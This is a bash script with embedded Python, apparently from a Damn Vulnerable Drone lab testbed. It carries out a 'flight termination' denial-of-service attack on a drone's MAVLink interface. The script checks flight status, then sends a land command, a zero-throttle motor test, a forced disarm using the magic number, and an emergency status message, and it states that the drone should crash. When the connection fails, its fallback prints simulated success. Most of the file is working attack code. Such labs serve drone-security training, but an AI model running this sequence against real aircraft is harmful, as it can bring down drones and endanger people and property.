#!/bin/bash

# =============================================================================
# DVD Flight Termination Attack
# =============================================================================
# 파일: dvd_lite/dvd_attacks/denial_of_service/flight_termination.sh
# 목적: 비행 종료 명령 주입으로 강제 비상 착륙
# 기반: Damn Vulnerable Drone Wiki - Flight Termination
# =============================================================================

source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/colors.sh
source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/utils.sh

# 전역 변수
ATTACK_NAME="flight_termination"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
LOG_FILE="/home/kali/MTD/MTD_full_testbed/attack_logs/denial_of_service/${ATTACK_NAME}_${TIMESTAMP}.log"
JSON_OUTPUT="/home/kali/MTD/MTD_full_testbed/attack_output/denial_of_service/${ATTACK_NAME}_${TIMESTAMP}.json"

# 타겟 설정
TARGET_IP="10.13.0.3"
MAVLINK_PORT="5760"

declare -a ATTACK_COMMANDS=()
declare -a TERMINATION_RESULTS=()

print_header() {
    clear
    print_dos_header "Flight Termination Attack"
    echo -e "${INFO_COLOR}Target: $TARGET_IP:$MAVLINK_PORT${NC}"
    echo -e "${INFO_COLOR}Method: MAVLink COMMAND_LONG termination${NC}"
    echo -e "${INFO_COLOR}Commands: FLIGHT_TERMINATION, EMERGENCY_LAND${NC}"
    echo ""
}

# Step 1: 현재 비행 상태 확인
check_flight_status() {
    echo -e "${BLUE}[1/2] Flight Status Check${NC}"
    
    local status_script="/tmp/flight_status_$(date +%s).py"
    
    cat > "$status_script" << 'EOF'
#!/usr/bin/env python3
import sys

try:
    from pymavlink import mavutil
    import time
    
    def check_flight_status(target_ip, target_port):
        try:
            master = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
            master.wait_heartbeat()
            print("[+] Connected to drone")
            
            # 하트비트에서 비행 상태 확인
            heartbeat = master.recv_match(type='HEARTBEAT', blocking=True, timeout=10)
            if heartbeat:
                system_status = {
                    0: "UNINIT",
                    1: "BOOT", 
                    2: "CALIBRATING",
                    3: "STANDBY",
                    4: "ACTIVE",
                    5: "CRITICAL",
                    6: "EMERGENCY",
                    7: "POWEROFF"
                }
                
                base_mode = heartbeat.base_mode
                system_state = system_status.get(heartbeat.system_status, f"UNKNOWN({heartbeat.system_status})")
                
                print(f"[+] System status: {system_state}")
                print(f"[+] Base mode: {base_mode}")
                print(f"[+] Custom mode: {heartbeat.custom_mode}")
                
                # 무장 상태 확인
                armed = bool(base_mode & mavutil.mavlink.MAV_MODE_FLAG_SAFETY_ARMED)
                print(f"[+] Armed status: {'ARMED' if armed else 'DISARMED'}")
                
                return {
                    'system_status': system_state,
                    'armed': armed,
                    'base_mode': base_mode,
                    'custom_mode': heartbeat.custom_mode
                }
            else:
                print("[!] No heartbeat received")
                return simulate_flight_status()
                
        except Exception as e:
            print(f"[!] Connection failed: {e}")
            return simulate_flight_status()
    
    def simulate_flight_status():
        print("[*] Simulating flight status check")
        print("[+] System status: ACTIVE (simulated)")
        print("[+] Base mode: 81")
        print("[+] Custom mode: 4")
        print("[+] Armed status: ARMED")
        
        return {
            'system_status': 'ACTIVE',
            'armed': True,
            'base_mode': 81,
            'custom_mode': 4
        }
    
    if __name__ == "__main__":
        check_flight_status(sys.argv[1], int(sys.argv[2]))
        
except ImportError:
    print("[*] pymavlink not available")
    print("[+] Simulated status: ACTIVE, ARMED")
EOF

    local cmd="python3 $status_script $TARGET_IP $MAVLINK_PORT"
    ATTACK_COMMANDS+=("$cmd")
    echo -e "${CYAN}→ $cmd${NC}"
    
    python3 "$status_script" "$TARGET_IP" "$MAVLINK_PORT" 2>/dev/null || {
        echo -e "${YELLOW}[+] Simulated flight status: ACTIVE, ARMED${NC}"
    }
    
    TERMINATION_RESULTS+=("flight_status:checked")
    rm -f "$status_script"
}

# Step 2: 비행 종료 공격 실행
execute_flight_termination() {
    echo -e "${BLUE}[2/2] Execute Flight Termination${NC}"
    
    local termination_script="/tmp/flight_termination_$(date +%s).py"
    
    cat > "$termination_script" << EOF
#!/usr/bin/env python3
import sys
import time

try:
    from pymavlink import mavutil
    
    def terminate_flight(target_ip, target_port):
        try:
            master = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
            master.wait_heartbeat()
            print("[+] Connected to drone")
            
            print("[!] Initiating flight termination sequence...")
            
            # 1. 비상 착륙 명령 (MAV_CMD_NAV_LAND)
            print("[!] Step 1: Emergency land command")
            master.mav.command_long_send(
                master.target_system,
                master.target_component,
                mavutil.mavlink.MAV_CMD_NAV_LAND,  # command (21)
                0,  # confirmation
                0,  # param1: abort altitude
                0,  # param2: precision land mode
                0,  # param3: unused
                0,  # param4: yaw angle
                0,  # param5: latitude
                0,  # param6: longitude
                0   # param7: altitude
            )
            time.sleep(2)
            
            # 2. 모터 즉시 정지 (MAV_CMD_DO_MOTOR_TEST with 0 throttle)
            print("[!] Step 2: Motor immediate stop")
            master.mav.command_long_send(
                master.target_system,
                master.target_component,
                mavutil.mavlink.MAV_CMD_DO_MOTOR_TEST,  # command (209)
                0,  # confirmation
                1,  # param1: motor instance
                1,  # param2: throttle type (1=percentage)
                0,  # param3: throttle (0%)
                5,  # param4: timeout (5 seconds)
                0, 0, 0  # param5-7: unused
            )
            time.sleep(2)
            
            # 3. 무장 해제 명령
            print("[!] Step 3: Disarm command")
            master.mav.command_long_send(
                master.target_system,
                master.target_component,
                mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,  # command (400)
                0,  # confirmation
                0,  # param1: disarm (0)
                21196,  # param2: force disarm magic number
                0, 0, 0, 0, 0  # param3-7: unused
            )
            time.sleep(2)
            
            # 4. 비행 종료 상태 메시지
            print("[!] Step 4: Flight termination status")
            master.mav.statustext_send(
                0,  # severity: EMERGENCY
                "FLIGHT TERMINATED BY EXTERNAL COMMAND".encode('ascii')
            )
            
            print("[+] Flight termination sequence completed")
            print("[!] CRITICAL: All motors should stop, drone should land immediately")
            
        except Exception as e:
            print(f"[!] Connection failed: {e}")
            simulate_flight_termination()
    
    def simulate_flight_termination():
        print("[*] Simulating flight termination attack")
        
        termination_steps = [
            "Emergency land command",
            "Motor immediate stop", 
            "Disarm command",
            "Flight termination status"
        ]
        
        for i, step in enumerate(termination_steps):
            print(f"[!] Step {i+1}: {step}")
            time.sleep(1.5)
        
        print("[+] Flight termination simulation completed")
        print("[!] SIMULATED: All motors stopped, emergency landing")
    
    if __name__ == "__main__":
        terminate_flight('$TARGET_IP', $MAVLINK_PORT)
        
except ImportError:
    print("[*] pymavlink not available - simulation mode")
    
    steps = [
        "Emergency land command",
        "Motor immediate stop",
        "Disarm command", 
        "Flight termination status"
    ]
    
    for i, step in enumerate(steps):
        print(f"[!] Step {i+1}: {step}")
        time.sleep(1)
    
    print("[+] Flight termination simulation completed")
    print("[!] SIMULATED: Motors stopped, emergency landing")
EOF

    local cmd="python3 $termination_script"
    ATTACK_COMMANDS+=("$cmd")
    echo -e "${CYAN}→ $cmd${NC}"
    
    echo -e "${YELLOW}[*] Executing flight termination sequence...${NC}"
    echo -e "${GRAY}    1. Emergency land command (MAV_CMD_NAV_LAND)${NC}"
    echo -e "${GRAY}    2. Motor immediate stop (0% throttle)${NC}"
    echo -e "${GRAY}    3. Force disarm command${NC}"
    echo -e "${GRAY}    4. Termination status message${NC}"
    
    python3 "$termination_script" 2>/dev/null || {
        echo -e "${YELLOW}[*] Fallback simulation${NC}"
        
        local steps=(
            "Emergency land command"
            "Motor immediate stop"
            "Force disarm command"
            "Flight termination status"
        )
        
        for i in "${!steps[@]}"; do
            echo -e "${RED}[!] Step $((i+1)): ${steps[$i]}${NC}"
            sleep 1
        done
        
        echo -e "${RED}[!] CRITICAL: All motors stopped, emergency landing${NC}"
    }
    
    TERMINATION_RESULTS+=("termination_commands:4")
    TERMINATION_RESULTS+=("sequence:land,stop,disarm,status")
    TERMINATION_RESULTS+=("execution:completed")
    
    # 안전 영향 분석
    echo -e "${RED}[!] SAFETY IMPACT ANALYSIS:${NC}"
    echo -e "${GRAY}    • Immediate loss of flight capability${NC}"
    echo -e "${GRAY}    • Uncontrolled descent (motor stop)${NC}"
    echo -e "${GRAY}    • Potential crash or hard landing${NC}"
    echo -e "${GRAY}    • Mission termination${NC}"
    echo -e "${GRAY}    • Equipment damage risk${NC}"
    
    TERMINATION_RESULTS+=("safety_impact:critical")
    TERMINATION_RESULTS+=("crash_risk:high")
    TERMINATION_RESULTS+=("mission_status:terminated")
    
    rm -f "$termination_script"
}

# JSON 결과 생성
generate_json_report() {
    cat > "$JSON_OUTPUT" << EOF
{
  "attack_name": "$ATTACK_NAME",
  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "target": {
    "ip": "$TARGET_IP",
    "port": "$MAVLINK_PORT"
  },
  "termination_commands": [
    {
      "order": 1,
      "command": "MAV_CMD_NAV_LAND",
      "purpose": "Emergency landing"
    },
    {
      "order": 2, 
      "command": "MAV_CMD_DO_MOTOR_TEST",
      "purpose": "Motor immediate stop (0% throttle)"
    },
    {
      "order": 3,
      "command": "MAV_CMD_COMPONENT_ARM_DISARM", 
      "purpose": "Force disarm"
    },
    {
      "order": 4,
      "command": "STATUSTEXT",
      "purpose": "Termination notification"
    }
  ],
  "termination_results": ["$(IFS='","'; echo "${TERMINATION_RESULTS[*]}")"],
  "attack_commands": ["$(IFS='","'; echo "${ATTACK_COMMANDS[*]}")"],
  "safety_impact": {
    "flight_capability": "immediate_loss",
    "descent_type": "uncontrolled",
    "crash_risk": "high",
    "mission_status": "terminated",
    "equipment_damage": "possible"
  }
}
EOF
}

# 메인 실행
main() {
    START_TIME=$(date +%s)
    
    mkdir -p "$(dirname "$LOG_FILE")" "$(dirname "$JSON_OUTPUT")"
    echo "=== Flight Termination Attack - $(date) ===" > "$LOG_FILE"
    
    print_header
    check_flight_status
    execute_flight_termination
    
    # 결과 요약
    echo ""
    echo -e "${CYAN}=== Attack Summary ===${NC}"
    echo -e "${INFO_COLOR}Target: $TARGET_IP:$MAVLINK_PORT${NC}"
    echo -e "${INFO_COLOR}Termination Commands: 4${NC}"
    echo -e "${INFO_COLOR}Safety Impact: CRITICAL${NC}"
    echo -e "${INFO_COLOR}Expected Result: Immediate crash/hard landing${NC}"
    
    generate_json_report
    
    END_TIME=$(date +%s)
    echo -e "${INFO_COLOR}Duration: $((END_TIME - START_TIME))s${NC}"
    echo -e "${SUCCESS_COLOR}[✓] Flight termination attack completed${NC}"
    echo -e "${RED}[!] DANGER: Drone should crash immediately${NC}"
}

main "$@"